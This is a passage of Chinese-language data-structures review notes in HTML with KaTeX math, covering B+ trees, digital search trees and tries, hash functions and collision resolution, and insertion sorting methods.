mtight">+</span></span></span></span></span></span></span></span></span></span></span>树的区别</p><ol><li>**在B+树中，具有n个关键字的结点只含有n棵子树，**每一个关键字为其指向的子树根结点最大关键字。**在B树中，具有n个关键字的结点含有n+1个棵子树，**因为每一个关键字分为含有比它小关键字的子树和比它大关键字的子树。</li><li><strong>在B+树中，每个非根内部结点的关键字个数n的范围是⌈m/2⌉≤n≤m，根结点2≤n≤m。在B树中，每个非根内部结点的关键字个数n的范围是⌈m/2⌉-1≤n≤m-1，根结点1≤n≤m-1。</strong></li><li>**在B+树中，叶结点包含全部信息，所以非叶结点仅起索引作用，**非叶结点中每个索引项只含有对应子树的最大关键字和指向该子树的指针，不含有该关键字对应记录的存储地址。</li><li>**在B+树中，**叶结点包含了全部关键字，<strong>非叶结点中出现的关键字也会出现在叶结点中；而在B树中，内部结点的关键字都是不重复的。</strong></li></ol><p><mark>B+树上进行随机查找，插入，删除的分析过程基本上与B-树类似</mark></p></li><li><p>查找:若非叶子节点上的关键字等于<code>key</code>时,并不终止，而是继续向下直到叶子节点</p></li><li><p>插入:B+树的插入仅在叶子节点中进行，当节点中的关键字个数大于<code>m</code>时,要分裂成两个结点，关键字个数分别为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mfrac><mrow><mi>m</mi><mo>+</mo><mn>1</mn></mrow><mn>2</mn></mfrac><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil \frac{m+1}{2}\rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mopen">⌈</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌉</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mfrac><mrow><mi>m</mi><mo>+</mo><mn>1</mn></mrow><mn>2</mn></mfrac><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil \frac{m+1}{2}\rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mopen">⌈</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌉</span></span></span></span>，且双亲节点同时包含这两个节点中的最大关键字</p></li><li><p>删除:B+树的删除仅在叶子节点进行，当叶子节点中的最大关键字被删除时，其在非终端节点中的值可以作为一个分界关键字存在,若因删除而使节点中的关键字的个数少于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mfrac><mi>m</mi><mn>2</mn></mfrac><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil \frac{m}{2}\rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.095em;vertical-align:-0.345em;"></span><span class="mopen">⌈</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌉</span></span></span></span>，与其他兄弟节点的合并过程与B-树相同</p></li><li><p>代码实现:可以看看这篇文章<a href="https://juejin.cn/post/6844904186656768008">B+Tree原理、算法的解析和实现，超详细，图+代码，ο(=•ω＜=)ρ⌒☆ - 掘金 (juejin.cn)</a></p></li></ul><h4 id="键树digital-search-trees"><a class="markdownIt-Anchor" href="#键树digital-search-trees"></a> 键树(Digital Search Trees)</h4><ul><li><p>概念:<mark>它是一棵度大于等于2的树</mark>，树中的每个节点不是包含一个或几个关键字，<mark>而是只含有组成关键字的符号</mark></p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240531112622339.png" class="" alt="image-20240531112622339" loading="lazy"><ul><li><p>从根到叶子结点路径中节点的字符组成的字符串表示一个关键字，叶子节点中的特殊符号<code>$</code>表示字符串的结束</p></li><li><p>在叶子节点中还含有指向该关键字记录的指针</p></li><li><p>为了查找和插入方便，我们约定键树是有序数，即同一层中兄弟节点之间依所含字符从左到右有序,并约定<code>$</code>小于任何字符</p></li><li><p>键树中每个节点的最大度d与关键字的基有关，若关键词是单词则d=27，若关键词是数值，则d=11</p></li><li><p>键树的深度则取决于关键字中字符或数位的个数</p></li></ul><p>键树的用途:快速查找，自动补全，字典存储，最长前缀匹配，数据压缩，统计功能，拼写检查和纠正</p><p>通常键树有两种存储结构,分别称为<mark>双链树</mark>和<mark>Trie树</mark></p><ul><li><p>双链树</p><ul><li><p>此种数据结构通常用<code>左孩子，右兄弟链表</code>来表示键树，则每个分支节点包括3个域：</p><ul><li>symbol域： 存储关键字的一个字符；</li><li>first域： 存储指向第一棵子树根的指针；</li><li>next域: 存储指向右兄弟的指针；</li></ul><p>同时，叶子节点的<code>infoptr</code>域存储指向该关键字记录的指针。此时的键树又称<code>双链树</code>。上图所示的双链树如下图所示</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240531120802636.png" class="" alt="image-20240531120802636" loading="lazy"></li><li><p>查找</p><p>假设给定值为<code>K.ch(0..num-1)</code>，其中<code>K.ch[0]</code>至<code>K.ch[num-2]</code>表示待查关键字中<code>num-1</code>个字符，<code>K.ch[num-1]</code>为结束符<code>$</code>，从双链树的根指针出发，顺first指针找到第一棵子树的根节点，以<code>K.ch[0]</code>和此节点的<code>symbol域</code>比较，若相等，则顺<code>first域</code>再比较下一字符，否则沿<code>next域</code>顺序查找。若直至<code>空</code>仍比较不等，则查找不成功。</p></li><li><p>键树中每个节点的最大度<code>d</code>和关键字的“基”有关。若关键字是单词，则<code>d=27</code>; 若关键字是数值，则d=11。键树的深度取决于关键字中字符或数位的个数。假设关键字为随机的（即关键字中每一位取基内任何值的概率相同），则在双链树中查找每一位的平均查找长度为<code>(1+d)/2</code>。又假设关键字中字符（或数位）的个数都相等，则在双链树中进行查找的平均查找长度为<code>h*(1+d)/2</code>。</p><p>在双链树中插入或删除一个关键字，相当于在树中某个节点上插入或删除一棵子树</p></li></ul></li><li><p>Trie树</p><ul><li><p>若以树的<code>多重链表</code>表示键树，则树的每个节点中应含有d个指针域，此时的键树又称<code>Trie树</code>。若从键树中某个节点到叶子节点的路径上每个节点都只有一个孩子，则可将该路径上的所有节点压缩成一个<code>&quot;叶子节点&quot;</code>，且在该叶子节点中存储关键字及指向记录的指针等信息。例如，在<code>ds-ds-tree</code>所示的键树中，从节点<code>Z</code>到节点<code>$</code>为单支树，则在下图所示相应的<code>Trie树</code>中只有一个含关键字<code>ZHAO</code>及相关信息的叶子节点。由此，在<code>Trie树</code>中有两种节点：</p><ul><li>分支节点： 含有d个指针域和一个指示该节点中非空指针域的个数的整数域</li><li>叶子节点: 含有关键字域和指向记录的指针域</li></ul><p>在分支节点中不设数据域，每个分支节点所表示的字符均由其双亲节点中（指向该节点）的指针位置所决定。</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240531121223176.png" class="" alt="image-20240531121223176" loading="lazy"></li><li><p>查找</p><p>根节点出发，沿和给定值相应的指针逐层向下，直至叶子节点， 若叶子节点中的关键字和给定值相等，则查找成功；若分支节点中和给定值相应的指针为空，或叶节点中的关键字和给定值不相等，则查找不成功。</p></li></ul></li></ul></li></ul><h3 id="哈希表"><a class="markdownIt-Anchor" href="#哈希表"></a> 哈希表</h3><h4 id="构造哈希函数"><a class="markdownIt-Anchor" href="#构造哈希函数"></a> 构造哈希函数</h4><ul><li><p>直接定址法</p><p>关键字的线性函数如 H（key）=a*key+b</p></li><li><p>数字分析法</p><p>假设关键字集合中的每个关键字key都是由s位数字组成,分析key中的全体数据，并从中提取分布均匀的若干位或他们的组合构成全体</p><p>此种方法通常用于数字位数较长的情况，必须数字存在一定规律，其必须知道数字的分布情况，比如身份证号有规律，我们事先知道这个班级的学生出生在同一年，同一个地区。就可以用H（key）=key%100000,截取后面不同的5位来存储</p></li><li><p>平方取中法</p><p>如果关键字的每一位都有某些数字重复出现频率很高的现象，可以先求关键字的平方值，通过平方扩大差异，而后取中间数位作为最终存储地址。</p><p>比如key=1234 1234^2=1522756 取227作hash地址<br />比如key=4321 4321^2=18671041 取671作hash地址<br />这种方法适合事先不知道数据并且数据长度较小的情况</p></li><li><p>折叠法</p><p>如果数字的位数很多，可以将数字分割为几个部分，取他们的叠加和作为hash地址<br />使用举例<br />比如key=123 456 789<br />我们可以存储在61524，取末三位，存在524的位置<br />该方法适用于数字位数较多且事先不知道数据分布的情况</p></li><li><p>除留取余法</p><p>H（key）=key MOD p （p&lt;=m m为表长）</p></li><li><p>随机数法</p><p>H（key） =Random（key） 取关键字的随机函数值为它的散列地址</p></li></ul><h4 id="处理冲突"><a class="markdownIt-Anchor" href="#处理冲突"></a> 处理冲突</h4><ul><li><p><mark>开放定址法</mark></p><p>首先有一个H（key）的哈希函数</p><p>如果H(key1)=H(keyi)</p><p>那么keyi存储位置<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>H</mi><mi>i</mi></msub><mo>=</mo><mo stretchy="false">(</mo><mi>H</mi><mo stretchy="false">(</mo><mi>k</mi><mi>e</mi><mi>y</mi><mo stretchy="false">)</mo><mo>+</mo><msub><mi>d</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mi>M</mi><mi>O</mi><mi>D</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">H_i=(H(key)+d_i)MODm</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">m</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">d_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>有三种取法</p><ol><li><p>线性探测再散列</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>m</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">d_i=1,2,3,...,m-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p></li><li><p>平方探测再散列</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mi>i</mi></msub><mo>=</mo><msup><mn>1</mn><mn>2</mn></msup><mo separator="true">,</mo><mo>−</mo><msup><mn>1</mn><mn>2</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>2</mn></msup><mo separator="true">,</mo><mo>−</mo><msup><mn>2</mn><mn>2</mn></msup><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">d_i=1^2,-1^2,2^2,-2^2...</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">−</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span></span></span></p></li><li><p>随机探测再散列</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">d_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是一组伪随机数列</p><p><strong>注意</strong><br />增量di应该具有以下特点（完备性）：产生的Hi（地址）均不相同，且所产生的s（m-1）个Hi能覆盖hash表中的所有地址</p><ul><li>平方探测时表长m必须为4j+3的质数（平方探测表长有限制）</li><li>随机探测时m和di没有公因子（随机探测di有限制）</li></ul></li></ol></li><li><p><mark>链地址法</mark></p><p>产生hash冲突后在存储数据后面加一个指针，指向后面冲突的数据</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240531125616405.png" class="" alt="image-20240531125616405" loading="lazy"></li><li><p>再哈希法</p><p>准备若干个hash函数，如果使用第一个hash函数发生了冲突，就使用第二个hash函数，第二个也冲突，使用第三个……</p></li><li><p>建立公共溢出区法</p><p>建立一个特殊存储空间，专门存放冲突的数据。此种方法适用于数据和冲突较少的情况。</p></li></ul><h4 id="查找"><a class="markdownIt-Anchor" href="#查找"></a> 查找</h4><p>查找过程和造表过程一致，假设采用开放定址法处理冲突，则查找过程为：<br />对于给定的key，计算hash地址index = H（key）<br />如果数组arr[index]的值为空 则查找不成功<br />如果数组arr[index]== key 则查找成功<br />否则 使用冲突解决方法求下一个地址，直到arr[index]== key或者 arr[index]==null</p><ul><li><p>性能分析</p><p>决定hash表查找的ASL因素：<br />1）选用的hash函数<br />2）选用的处理冲突的方法<br />3）hash表的饱和度，装载因子 α=n/m(n表示实际装载数据长度 m为表长)<br />一般情况，假设hash函数是均匀的，则在讨论ASL时可以不考虑它的因素<br />hash表的ASL是处理冲突方法和装载因子的函数</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240531125929108.png" class="" alt="image-20240531125929108" loading="lazy"><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240531130026741.png" class="" alt="image-20240531125929108" loading="lazy"><p>可以看到无论哪个函数，装载因子越大，平均查找长度越大，那么装载因子α越小越好？也不是，就像100的表长只存一个数据，α是小了，但是空间利用率不高啊，这里就是时间空间的取舍问题了。通常情况下，认为α=0.75是时间空间综合利用效率最高的情况。</p></li></ul><h4 id="删除"><a class="markdownIt-Anchor" href="#删除"></a> 删除</h4><p>首先链地址法是可以直接删除元素的，但是开放定址法是不行的，拿前面的双探测再散列来说，假如我们删除了元素1，将其位置置空，那 23就永远找不到了。正确做法应该是删除之后置入一个原来不存在的数据，比如-1</p><h2 id="chap10-内部排序"><a class="markdownIt-Anchor" href="#chap10-内部排序"></a> Chap10 内部排序</h2><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/1156494-ab4cecff133d87b3.webp" class="" alt="img" loading="lazy"><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/1156494-62f859c2ac6f95ff.webp" class="" alt="img" loading="lazy"><p>以上理解记忆</p><p><mark>排序的稳定性:如果两个元素有相等的键值，在排序后这两个元素的相对顺序应保持不变</mark></p><p>稳定:插帽归基</p><h3 id="插入排序"><a class="markdownIt-Anchor" href="#插入排序"></a> 插入排序</h3><ul><li><p><strong>直接插入排序</strong>(Straight Insertion Sort)</p><p>假设原始数组是：3 1 4 2 6 2 1 6 7</p><p>将数组分成两个区域，一个是有序区域一个是无序区域，最开始初始化有序区域（用黄色表示）为第一个数，无需区域为剩下部分。</p><p>第一次：3 1 4 2 6 2 1 6 7</p><p>将无序区域第一个数与有序区域作比较，判断该数适合插入的位置，这里就是1 和 3做比较，发现1应该插入3的前面</p><p>第二次：1 3 4 2 6 2 1 6 7</p><p>同理将4和 1 3 作比较确定插入位置</p><p>第三次：1 3 4 2 6 2 1 6 7</p><p>下面几次同理</p><p>第四次：1 2 3 4 6 2 1 6 7<br />第五次：1 2 3 4 6 2 1 6 7<br />第六次：1 2 2 3 4 6 1 6 7<br />第七次：1 1 2 2 3 4 6 6 7<br />第八次：1 1 2 2 3 4 6 6 7<br />第九次：1 1 2 2 3 4 6 6 7</p><ul><li>稳定性：稳定</li><li>时间复杂度:<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li></ul></li><li><p>折半插入排序(Binary Insertion Sort)</p><p>在直接插入排序的基础上，在确定插入位置的时候使用了折半查找</p><ul><li>稳定性:稳定</li><li>时间复杂度:由于折半插入排序仅仅减少了关键字的比较次数，而记录的移动次数不变，所以时间复杂度仍然是:<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li></ul></li><li><p>2-路插入排序</p><ul><li><p><code>2-路插入排序</code>是在折半插入排序的基础上进行改进，目的是减少<code>排序过程中移动记录的次数</code></p></li><li><p>代价:需要借助n个记录的辅助空间</p></li><li><p>过程：简而言之，就是开个n个记录的辅助空间，然后<code>front</code>指向最小值,<code>final</code>指向最大值,利用`</p><ol><li><strong>双端队列</strong>:<ul><li>维护一个双端队列，这个队列能够在两端进行插入和删除操作。</li><li>初始时，队列中只有一个元素，即原数组的第一个元素。</li></ul></li><li><strong>插入过程</strong>:<ul><li>对于每个新元素，通过比较该元素与队列两端的元素来决定插入位置：<ul><li>如果新元素小于队列的最左端元素，则插入到队列的左端。</li><li>如果新元素大于队列的最右端元素，则插入到队列的右端。</li><li>如果新元素介于队列的最左端和最右端元素之间，则需要找到合适的位置插入，这时可以通过移动元素来腾出位置。</li></ul></li></ul></li><li><strong>最终排序</strong>:<ul><li>在插入完成后，双端队列中的元素已经按序排列好，只需将队列中的元素依次拷贝回原数组即可。</li></ul></li></ol></li><li><p>性能分析</p><p>对每个元素而言，找到插入位置的时间复杂度仍然是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，这里<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>是已排序部分的大小。插入操作涉及将元素插入到双端队列的某一端，因此每次插入的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span 